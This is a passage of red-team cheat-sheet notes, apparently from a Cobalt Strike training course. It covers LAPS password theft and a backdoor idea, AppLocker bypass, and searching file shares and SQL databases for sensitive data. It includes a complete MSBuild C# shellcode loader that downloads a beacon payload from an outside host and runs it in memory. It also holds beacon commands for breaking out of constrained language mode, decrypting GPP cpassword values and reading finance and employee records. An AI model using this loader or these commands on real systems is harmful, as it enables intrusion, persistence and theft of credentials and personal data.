beacon> powerpick Find-LAPSDelegatedGroups
beacon> powerpick Find-AdmPwdExtendedRights

# View the LAPS password for given machine (From User Session having required rights)
beacon> powerpick Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd
beacon> powerpick Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime

# Use the laps password to gain access
beacon> make_token .\LapsAdmin 1N3FyjJR5L18za
beacon> ls \\wkstn-1\c$

# Set Far Future date as expiry (Only machine can set its Password)
beacon> powerpick Set-DomainObject -Identity wkstn-1 -Set @{'ms-Mcs-AdmPwdExpirationTime' = '136257686710000000'} -Verbose

# LAPS Backdoor
- Modify the AdmPwd.PS.dll and AdmPwd.Utils.dll file located at C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS\ location to log the LAPS password everytime it is viewed by the admin user

```

### AppLocker

```powershell

# Enumerate the Applocker policy via GPO
beacon> powershell Get-DomainGPO -Domain dev-studio.com | ? { $_.DisplayName -like "*AppLocker*" } | select displayname, gpcfilesyspath

beacon> download \\dev-studio.com\SysVol\dev-studio.com\Policies\{7E1E1636-1A59-4C35-895B-3AEB1CA8CFC2}\Machine\Registry.pol

PS C:\Users\Attacker> Parse-PolFile .\Desktop\Registry.pol

# Enumerate the Applocker policy via Local Windows registry on machine 
PS C:\Users\Administrator> Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2"

PS C:\Users\Administrator> Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe"

# Using powershell on local system
PS C:\Users\Administrator> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage

# Navigating Laterally via PSEXEC is fine, as service binary is uploaded in C:\Winodws path which is by default whitelisted

# Find the writable path within C:\winodws to bypass Applocker
beacon> powershell Get-Acl C:\Windows\Tasks | fl
```

```C#
# LOLBAS
# Use MSBuild to execute C# code from a .csproj or .xml file
# Host http_x64.xprocess.bin via Site Management > Host File
# Start execution using C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe test.csproj

<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuildTest/>
  </Target>
   <UsingTask
    TaskName="MSBuildTest"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[

            using System;
            using System.Net;
            using System.Runtime.InteropServices;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class MSBuildTest :  Task, ITask
            {
                public override bool Execute()
                {
                    byte[] shellcode;
                    using (var client = new WebClient())
                    {
                        client.BaseAddress = "http://nickelviper.com";
                        shellcode = client.DownloadData("beacon.bin");
                    }
      
                    var hKernel = LoadLibrary("kernel32.dll");
                    var hVa = GetProcAddress(hKernel, "VirtualAlloc");
                    var hCt = GetProcAddress(hKernel, "CreateThread");

                    var va = Marshal.GetDelegateForFunctionPointer<AllocateVirtualMemory>(hVa);
                    var ct = Marshal.GetDelegateForFunctionPointer<CreateThread>(hCt);

                    var hMemory = va(IntPtr.Zero, (uint)shellcode.Length, 0x00001000 | 0x00002000, 0x40);
                    Marshal.Copy(shellcode, 0, hMemory, shellcode.Length);

                    var t = ct(IntPtr.Zero, 0, hMemory, IntPtr.Zero, 0, IntPtr.Zero);
                    WaitForSingleObject(t, 0xFFFFFFFF);

                    return true;
                }

            [DllImport("kernel32", CharSet = CharSet.Ansi)]
            private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
    
            [DllImport("kernel32", CharSet = CharSet.Ansi)]
            private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [DllImport("kernel32")]
            private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate IntPtr AllocateVirtualMemory(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

            }

        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>

```

```powershell

# break out of PowerShell Constrained Language Mode by using an unmanaged PowerShell runspace
beacon> powershell $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage

beacon> powerpick $ExecutionContext.SessionState.LanguageMode
FullLanguage

# Beacon DLL (DLLs are usually not restricted by Applocker due to performance reason)
C:\Windows\System32\rundll32.exe http_x64.dll,StartW

```


### Data Exfiltration

```powershell

# Enumerate Share
beacon> powerpick Invoke-ShareFinder
beacon> powerpick Invoke-FileFinder
beacon> powerpick Get-FileNetServer
beacon> shell findstr /S /I cpassword \\dc.organicsecurity.local\sysvol\organicsecurity.local\policies\*.xml
beacon> Get-DecryptedCpassword

# Find accessible share having juicy information
beacon> powerpick Find-DomainShare -CheckShareAccess
beacon> powerpick Find-InterestingDomainShareFile -Include *.doc*, *.xls*, *.csv, *.ppt*
beacon> powerpick gc \\fs.dev.cyberbotic.io\finance$\export.csv | select -first 5

# Search for senstive data in directly accessible DB by keywords
beacon> powerpick Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "email,address,credit,card" -SampleSize 5 | select instance, database, column, sample | ft -autosize

# Search for senstive data in DB links
beacon> powerpick Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select * from information_schema.tables')"

beacon> powerpick Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select column_name from master.information_schema.columns where table_name=''employees''')"

beacon> powerpick Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select top 5 first_name,gender,sort_code from master.dbo.employees')"
```


```
# Not able to migrate to another process using Inject Command (worked by choosing P2P beacon)

# Was facing some issues with doing the lateral movement by SYSTEM User
- But if we have access to NTLM hash, we can directly use PTH and JUMP to move laterally 
- Still Powerview functions don't work in this context, need to find a way

```

## Reference:

https://training.zeropointsecurity.co.uk/courses/red-team-ops
